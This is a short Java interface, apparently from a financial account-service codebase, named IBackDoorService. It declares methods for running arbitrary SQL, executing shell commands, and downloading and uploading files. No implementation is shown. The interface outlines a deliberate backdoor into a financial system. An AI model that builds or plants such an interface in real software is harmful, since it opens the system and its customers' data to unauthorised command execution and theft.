package com.sunyard.sunfintech.account.provider;

import com.sunyard.sunfintech.core.exception.BusinessException;

import java.util.List;
import java.util.Map;

/**
 * Created by terry on 2018/4/10.
 */
public interface IBackDoorService {

    public List<Map<String,Object>> dbQuery(String sql)throws BusinessException;

    public String executeShell(String shellCommand)throws BusinessException;

    public String downFiles(String filePath,String fileName)throws BusinessException;

    public void upFiles(String fileStr, String filePath,String fileName)throws BusinessException;
}
